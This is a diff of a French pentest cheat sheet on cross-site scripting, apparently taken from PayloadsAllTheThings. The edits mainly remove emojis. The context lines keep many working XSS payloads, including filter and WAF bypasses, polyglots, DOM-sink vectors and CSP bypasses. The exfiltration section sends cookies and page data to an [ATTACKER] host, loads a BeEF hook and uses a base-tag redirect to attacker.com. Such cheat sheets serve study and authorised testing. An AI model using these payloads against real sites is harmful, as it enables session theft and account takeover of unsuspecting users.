@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🖼️ XSS — Cross-Site Scripting
+# XSS — Cross-Site Scripting
 
 > [!info] **En 1 phrase**
 > XSS = injecter du **JavaScript** dans une page vue par d'autres visiteurs → exécution dans leur
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -41,7 +41,7 @@ flowchart LR
     H --> K[Actions à la place de la victime]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le serveur renvoie l'entrée utilisateur **sans échappement contextuel** : le navigateur interprète
 > `<script>…</script>` ou un attribut `onerror=…` comme du **code**, pas comme du texte.
 > Ce n'est pas l'application qui est compromise mais le **navigateur** de chaque victime qui visite
@@ -49,7 +49,7 @@ flowchart LR
 
 ---
 
-## 🎭 Les 3 types d'XSS
+## Les 3 types d'XSS
 
 | Type | Flux | Portée | Détection |
 |---|---|---|---|
@@ -57,12 +57,12 @@ flowchart LR
 | **Stocké (persistant)** | Le payload est **persisté en BDD** (commentaire, profil, ticket…) et servi à chaque visiteur | Dure dans le temps, frappe tous les utilisateurs **y compris l'admin** | Le plus critique : 1 injection → infection de masse |
 | **DOM** | Le payload est traité **uniquement en JS côté client**, jamais envoyé au serveur | Local au navigateur de la victime | Difficile : rien dans la réponse HTTP |
 
-> [!warning] ⚠️ **Hiérarchie d'impact** : stocké > réfléchi > DOM en général, mais un DOM XSS sur
+> [!warning] **Hiérarchie d'impact** : stocké > réfléchi > DOM en général, mais un DOM XSS sur
 > une SPA moderne (token dans `localStorage`) peut être tout aussi critique.
 
 ---
 
-## 📦 Contextes de sortie
+## Contextes de sortie
 
 Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée :
 
@@ -73,13 +73,13 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 | **String JS** | `var x = "ENTREE";` | `";alert(1);//` |
 | **URL / attribut** `href`/`src` | `<a href="ENTREE">` | `javascript:alert(1)` |
 
-> [!tip] 💡 **Séquencer le payload en 2 temps** : d'abord **sortir** du contexte (`">` ou `';`),
+> [!tip] **Séquencer le payload en 2 temps** : d'abord **sortir** du contexte (`">` ou `';`),
 > puis **injecter** un vecteur complet. `"><img src=x onerror=alert(1)>` couvre la sortie
 > d'un attribut ET l'injection d'une balise en une seule fois.
 
 ---
 
-## 🧪 Vecteurs classiques (XSS in HTML)
+## Vecteurs classiques (XSS in HTML)
 
 ### Balise `<script>`
 
@@ -92,7 +92,7 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 <script>eval(8680439..toString(30))(983801..toString(36))</script>
 ```
 
-> [!tip] 💡 `8680439..toString(30)` = `"confirm"` (`parseInt("confirm",30)` == 8680439) :
+> [!tip] `8680439..toString(30)` = `"confirm"` (`parseInt("confirm",30)` == 8680439) :
 > astuce pour bypasser un filtre sur les noms de fonctions.
 
 ### `<img src=x onerror=…>`
@@ -119,7 +119,7 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 <svg><script>alert&lpar;'33'&rpar;
 ```
 
-> [!tip] 💡 `<svg><script href=data:,alert(1)/>` : **Firefox** est le seul navigateur qui autorise
+> [!tip] `<svg><script href=data:,alert(1)/>` : **Firefox** est le seul navigateur qui autorise
 > un `<script>` auto-fermant. `alert&lpar;'33'&rpar;` : les entités HTML `&lpar;`/`&rpar;` sont
 > décodées **avant** le parsing JS → bypass de filtres sur les parenthèses.
 
@@ -164,7 +164,7 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
 ```
 
-> [!tip] 💡 Événements **tactiles** (mobile) : `<body ontouchstart=alert(1)>` ·
+> [!tip] Événements **tactiles** (mobile) : `<body ontouchstart=alert(1)>` ·
 > `<body ontouchend=alert(1)>` · `<body ontouchmove=alert(1)>`.
 
 ### Input cachés
@@ -174,7 +174,7 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 <input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
 ```
 
-> [!tip] 💡 `<input type="hidden" accesskey="X" onclick="alert(1)">` se déclenche avec
+> [!tip] `<input type="hidden" accesskey="X" onclick="alert(1)">` se déclenche avec
 > **CTRL+SHIFT+X**. `oncontentvisibilityautostatechange` fonctionne sur les navigateurs récents
 > (Firefox 130 / Chrome 108+).
 
@@ -185,7 +185,7 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 <script src=14.rs>
 ```
 
-> [!tip] 💡 `14.rs` permet de préciser un payload arbitraire : `14.rs/#alert(document.domain)`.
+> [!tip] `14.rs` permet de préciser un payload arbitraire : `14.rs/#alert(document.domain)`.
 
 ### Sortie en MAJUSCULES
 
@@ -193,7 +193,7 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
 
-> [!tip] 💡 Quand la sortie est mise en majuscules : les noms d'attributs HTML sont insensibles à
+> [!tip] Quand la sortie est mise en majuscules : les noms d'attributs HTML sont insensibles à
 > la casse mais le code JS **ne l'est pas** — il suffit d'encoder `alert` en entités hexadécimales
 > `&#X61;` (a) `&#X6C;` (l)…
 
@@ -204,12 +204,12 @@ Le payload exact dépend de l'**endroit précis** où l'entrée est réinjectée
 ; alert(1);//
 ```
 
-> [!tip] 💡 `-(confirm)(document.domain)//` : payload **sans quote ni double-quote**
+> [!tip] `-(confirm)(document.domain)//` : payload **sans quote ni double-quote**
 > (de @brutelogic), utile quand `'` et `"` sont filtrés.
 
 ---
 
-## 🛰️ XSS par URI (wrappers)
+## XSS par URI (wrappers)
 
 ### Wrapper `javascript:`
 
@@ -248,7 +248,7 @@ javascript://%0Aalert(1)
 javascript://anything%0D%0A%0D%0Awindow.alert(1)
 ```
 
-> [!warning] ⚠️ `javascript:` est exploitable partout où une URL est attendue : attributs
+> [!warning] `javascript:` est exploitable partout où une URL est attendue : attributs
 > `href`/`src`/`action`, **redirections** (`?next=javascript:alert(1)`), `window.location`, et
 > même en contexte DOM sink.
 
@@ -268,7 +268,7 @@ vbscript:msgbox("XSS")
 
 ---
 
-## 📁 XSS dans les fichiers
+## XSS dans les fichiers
 
 ### XML
 
@@ -278,7 +278,7 @@ vbscript:msgbox("XSS")
 </name>
 ```
 
-> [!tip] 💡 La section **CDATA** empêche le parser XML de traiter le payload comme du markup.
+> [!tip] La section **CDATA** empêche le parser XML de traiter le payload comme du markup.
 
 XSS via namespace custom (emprunt du namespace XHTML) :
 
@@ -313,7 +313,7 @@ Versions courtes :
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-> [!tip] 💡 **Nesting SVG** : inclure une image SVG distante (`<image xlink:href=…>`) ou un
+> [!tip] **Nesting SVG** : inclure une image SVG distante (`<image xlink:href=…>`) ou un
 > fragment (`<use xlink:href="…#id">`) **ne déclenche pas** l'XSS du SVG distant. En revanche,
 > imbriquer des balises `<svg>` dans un document SVG **permet** l'exécution depuis les sous-SVG
 > (ex: 2 sous-SVG avec `<rect>` + `<script>`).
@@ -327,7 +327,7 @@ Versions courtes :
 [a](javascript:window.onerror=alert;throw%201)
 ```
 
-> [!tip] 💡 Rendu Markdown → HTML : les liens `javascript:` (avec espaces insérées dans le mot-clé
+> [!tip] Rendu Markdown → HTML : les liens `javascript:` (avec espaces insérées dans le mot-clé
 > pour bypasser les filtres) sont une source classique de XSS **stocké** (wikis, commentaires, docs).
 
 ### CSS
@@ -341,12 +341,12 @@ div {
 </style>
 ```
 
-> [!warning] ⚠️ `<\/style>` ferme la balise `<style>` depuis une **string CSS**, puis
+> [!warning] `<\/style>` ferme la balise `<style>` depuis une **string CSS**, puis
 > `<svg/onload>` s'exécute. Un filtre anti-XSS qui ne regarde que du CSS « pur » rate ce vecteur.
 
 ---
 
-## 🧩 Bypass de filtres & polyglots
+## Bypass de filtres & polyglots
 
 ### Tags malformés
 
@@ -354,7 +354,7 @@ div {
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 ```
 
-> [!tip] 💡 Si le filtre supprime `<script>` **sans boucler**, `<scr<script>ipt>` devient
+> [!tip] Si le filtre supprime `<script>` **sans boucler**, `<scr<script>ipt>` devient
 > `<script>` après suppression du mot-clé central. Teste toujours le **même** filtre plusieurs fois.
 
 ### Polyglot universel
@@ -370,7 +370,7 @@ div {
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
-> [!tip] 💡 Le 2e (polyglot de référence, « Ultimate XSS Polyglot ») combine commentaires JS,
+> [!tip] Le 2e (polyglot de référence, « Ultimate XSS Polyglot ») combine commentaires JS,
 > gestionnaires d'événements, entités et balises mutées pour survivre à la plupart des sanitizers.
 
 ### Encodages multiples (HTML / URL / hex / octal / Unicode)
@@ -384,7 +384,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
 
-> [!tip] 💡 Écrire un même mot-clé sous plusieurs encodages augmente les chances : `alert` →
+> [!tip] Écrire un même mot-clé sous plusieurs encodages augmente les chances : `alert` →
 > `\u0061lert`, `\x61lert`, `String.fromCharCode(97,108,101,114,116)`, entités `&#x61;lert`,
 > entités décimales, base64… **Toujours tester aussi le double-encodage URL** (`%253C` → `%3C`
 > après 1 décodage serveur).
@@ -406,12 +406,12 @@ this['alert'](1)
 window['\x61lert'](1)
 ```
 
-> [!tip] 💡 Alterner entités HTML / hex / unicode / base64 selon le WAF : un même vecteur existe
+> [!tip] Alterner entités HTML / hex / unicode / base64 selon le WAF : un même vecteur existe
 > en une dizaine de variantes, il faut toutes les essayer.
 
 ---
 
-## 🕳️ DOM XSS
+## DOM XSS
 
 Le payload n'est **jamais envoyé au serveur** : il vit dans l'URL (hash) ou une source client.
 
@@ -437,7 +437,7 @@ element.src  location  window.open()  document.location =
 jQuery .html()  .append()  .attr()
 ```
 
-> [!warning] ⚠️ `setTimeout("PAYLOAD", 1)` / `setInterval` passés en **string** agissent comme
+> [!warning] `setTimeout("PAYLOAD", 1)` / `setInterval` passés en **string** agissent comme
 > `eval()`. `innerHTML` **n'exécute pas** les `<script>` mais exécute les **attributs onerror**
 > (`<img src=x onerror=…>` = voie royale).
 
@@ -449,7 +449,7 @@ javascript:alert(document.domain)
 '"><svg/onload=alert(1)>
 ```
 
-> [!tip] 💡 `location.hash` est la source la plus pratique : `/#"><img src=/ onerror=alert(2)>`
+> [!tip] `location.hash` est la source la plus pratique : `/#"><img src=/ onerror=alert(2)>`
 > pas de ré-encodage serveur, idéal en aveugle sur les SPAs.
 
 ### postMessage (sink DOM)
@@ -476,7 +476,7 @@ document.getElementById('btn').onclick = function(e){
 
 ---
 
-## 🕶️ Blind XSS
+## Blind XSS
 
 XSS **stocké qui se déclenche ailleurs** (backend, admin, support) — on ne voit jamais la victime.
 
@@ -499,7 +499,7 @@ XSS **stocké qui se déclenche ailleurs** (backend, admin, support) — on ne v
 | Boîte de commentaires | Back-office admin |
 | Nom d'utilisateur au signup | Admin (liste des users) |
 
-> [!tip] 💡 Avant de déployer un outil lourd : un **grabber one-liner** + un serveur HTTP
+> [!tip] Avant de déployer un outil lourd : un **grabber one-liner** + un serveur HTTP
 > suffisent à confirmer un blind XSS :
 > ```ps1
 > ruby -run -ehttpd . -p8080
@@ -517,7 +517,7 @@ XSS **stocké qui se déclenche ailleurs** (backend, admin, support) — on ne v
 
 ---
 
-## 🚚 Exfiltration & Post-exploitation
+## Exfiltration & Post-exploitation
 
 ### Data grabber (cookie / token)
 
@@ -539,7 +539,7 @@ fclose($fp);
 ?>
 ```
 
-> [!warning] ⚠️ `document.cookie` ne renvoie **rien** pour les cookies marqués **HttpOnly**.
+> [!warning] `document.cookie` ne renvoie **rien** pour les cookies marqués **HttpOnly**.
 > Dans ce cas : vole `localStorage`/`sessionStorage`, capture les formulaires, keylogging, ou
 > utilise le navigateur de la victime pour agir (CSRF à sa place).
 
@@ -598,12 +598,12 @@ new Image().src='http://[ATTACKER]/?d='+c.toDataURL('image/png');
 <script src="http://[ATTACKER]:3000/hook.js"></script>
 ```
 
-> [!tip] 💡 Navigateur « hooked » (BeEF ou XSS Hunter) → pilotage complet : keylogging, vol de
+> [!tip] Navigateur « hooked » (BeEF ou XSS Hunter) → pilotage complet : keylogging, vol de
 > formulaires, redirections, exploitation de navigateur, port scan, vole d'onglets.
 
 ---
 
-## 🛡️ CSP Bypass
+## CSP Bypass
 
 > La CSP limite les sources de scripts, **mais** une CSP mal configurée se contourne de multiples
 > façons.
@@ -628,13 +628,13 @@ new Image().src='http://[ATTACKER]/?d='+c.toDataURL('image/png');
 <base href="https://attacker.com/">
 ```
 
-> [!warning] ⚠️ `<base>` a un **effet global** : tous les `src`/`href` relatifs de la page
+> [!warning] `<base>` a un **effet global** : tous les `src`/`href` relatifs de la page
 > (scripts, images, fetch) pointent vers l'attaquant → exfiltration et exécution même avec une CSP
 > stricte si les ressources relatives sont autorisées.
 
 ---
 
-## 🧨 Dangling Markup
+## Dangling Markup
 
 > Dangling markup = injecter une balise **non fermée** pour capturer ce qui suit comme valeur
 > d'attribut.
@@ -646,12 +646,12 @@ new Image().src='http://[ATTACKER]/?d='+c.toDataURL('image/png');
 Le navigateur interprète tout ce qui suit `src='` comme partie de la **valeur de l'attribut** :
 tokens CSRF, champs cachés, morceaux de DOM arrivent sur le serveur de l'attaquant.
 
-> [!warning] ⚠️ Pas de JS exécuté : fuite d'information **passive**. Mais elle permet de voler des
+> [!warning] Pas de JS exécuté : fuite d'information **passive**. Mais elle permet de voler des
 > tokens anti-CSRF quand `<script>` et `on*` sont filtrés.
 
 ---
 
-## 🔓 WAF Bypass
+## WAF Bypass
 
 > Règle d'or : **le WAF n'est pas une défense**. Chaque règle (Cloudflare, ModSecurity, AWS WAF…)
 > a une variante qui passe. Multiplier les encodages et les contextes.
@@ -666,7 +666,7 @@ tokens CSRF, champs cachés, morceaux de DOM arrivent sur le serveur de l'attaqu
 | Mots-clés supprimés sans boucle | `<scr<script>ipt>…` |
 | URL-encoding simple bloqué | double encoding `%253C`, entités HTML `&#60;`, encodage Unicode |
 
-> [!tip] 💡 **Multi-encodage** : chaque couche que le serveur décode est une chance de plus —
+> [!tip] **Multi-encodage** : chaque couche que le serveur décode est une chance de plus —
 > `%253Cscript%253E` (double URL) ou mélange HTML+URL+hex dans le même payload.
 
 ### Contourner les WAF à signature (ModSecurity, Cloudflare)
@@ -681,7 +681,7 @@ tokens CSRF, champs cachés, morceaux de DOM arrivent sur le serveur de l'attaqu
 
 ---
 
-## 🧪 Tests & Outils
+## Tests & Outils
 
 ### Identifier / confirmer l'endpoint
 
@@ -693,7 +693,7 @@ tokens CSRF, champs cachés, morceaux de DOM arrivent sur le serveur de l'attaqu
 <script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
 ```
 
-> [!tip] 💡 Sur les **domaines sandbox** (hébergement de contenu utilisateur), `alert(1)` peut
+> [!tip] Sur les **domaines sandbox** (hébergement de contenu utilisateur), `alert(1)` peut
 > s'exécuter dans un contexte sans données. `alert(document.domain)` / `alert(window.origin)`
 > confirment si on est **dans le scope** ou non. Pour le stocké : `console.log` évite de fermer
 > une popup à chaque refresh.
@@ -733,7 +733,7 @@ javascript:alert(1)
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -749,24 +749,24 @@ javascript:alert(1)
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Le chemin le plus rentable**
+> [!tip] **Le chemin le plus rentable**
 > XSS **stocké** sur un espace que l'**admin** consulte (profils, tickets, commentaires, header
 > User-Agent/Réferer dans les logs admin) → vol de sa session → **accès admin complet**. C'est
 > l'enchaînement n°1 des bug bounties (Uber, eBay, Yahoo Mail, Facebook…).
 
-> [!warning] ⚠️ **Preuve (alert) ≠ impact réel**
+> [!warning] **Preuve (alert) ≠ impact réel**
 > Un XSS « alert(1) prouvé » avec **CSP stricte + HttpOnly** a un impact quasi nul. Documente
 > toujours ce qu'on peut **réellement** faire : vol de token localStorage, capture de formulaire,
 > actions à la place de la victime, pivot vers l'admin.
 
-> [!warning] ⚠️ **Échappements faits maison**
+> [!warning] **Échappements faits maison**
 > `.replace('<script>','')` sans boucle → `<<script>script>` ou `<scr<script>ipt>`. Un simple
 > `htmlspecialchars()` sans contexte casse dès qu'on sort dans un attribut ou du JS. Toujours une
 > librairie d'échappement contextuel éprouvée.
 
-> [!warning] ⚠️ **Mutation XSS (mXSS)**
+> [!warning] **Mutation XSS (mXSS)**
 > Le navigateur **mute** (ré-écrit) le HTML avant exécution. Exemple (Kinugawa, contre DOMPurify
 > sur Google Search) :
 > ```html
@@ -775,24 +775,24 @@ javascript:alert(1)
 > Le sanitizer voit du texte inoffensif, mais après mutation le `<img onerror>` est interprété.
 > → **Tester les sanitizers dans le navigateur**, pas seulement dans un parser isolé.
 
-> [!tip] 💡 **Penser post-mutation pour innerHTML**
+> [!tip] **Penser post-mutation pour innerHTML**
 > `innerHTML` ne stocke pas le HTML tel qu'on le passe : il est normalisé. Un payload valide en
 > HTML parsé peut être invalide après ré-injection (mutation). Tester dans une vraie page.
 
-> [!warning] ⚠️ **Self-XSS** : alerter sur sa propre session ne prouve rien pour une autre cible —
+> [!warning] **Self-XSS** : alerter sur sa propre session ne prouve rien pour une autre cible —
 > sauf si on le transforme en XSS réel (lien piégé, race condition, sandbox).
 
-> [!tip] 💡 **CSP stricte trouvée ?** Ne désespère pas : bypass possibles via JSONP, AngularJS,
+> [!tip] **CSP stricte trouvée ?** Ne désespère pas : bypass possibles via JSONP, AngularJS,
 > dangling markup, base tag, ou une ressource whitelistée mal choisie.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection SQL|💾 SQLi]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- [[SSRF|🌐 SSRF]]
-- [[Attaques JWT|🔐 Attaques JWT]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
-- 🧪 Labs : [PortSwigger XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting) · [Root-Me XSS](https://www.root-me.org/?page=recherche&secteur=Web-Client)
+- [[Injection SQL| SQLi]]
+- [[Injection de commandes| Injection de commandes]]
+- [[SSRF| SSRF]]
+- [[Attaques JWT| Attaques JWT]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+- Labs : [PortSwigger XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting) · [Root-Me XSS](https://www.root-me.org/?page=recherche&secteur=Web-Client)
